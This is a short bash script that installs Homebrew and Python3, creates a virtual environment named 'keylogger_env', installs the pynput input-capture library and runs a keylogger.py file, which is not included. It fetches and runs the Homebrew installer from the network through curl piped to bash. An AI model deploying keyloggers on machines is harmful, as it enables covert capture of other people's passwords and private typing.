#!/bin/bash

# Check if Homebrew is installed
if ! command -v brew &>/dev/null; then
    echo "Homebrew not found. Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
else
    echo "Homebrew is already installed."
fi

# Check if Python3 is installed
if ! command -v python3 &>/dev/null; then
    echo "Installing Python3..."
    brew install python3
else
    echo "Python3 is already installed."
fi

# Create and activate a virtual environment
echo "Creating virtual environment..."
python3 -m venv keylogger_env
source keylogger_env/bin/activate

# Install dependencies (e.g., pynput and pygetwindow)
echo "Installing dependencies..."
pip3 install pynput

# Run the keylogger script
echo "Running the script..."
python3 keylogger.py

# Deactivate the virtual environment
deactivate
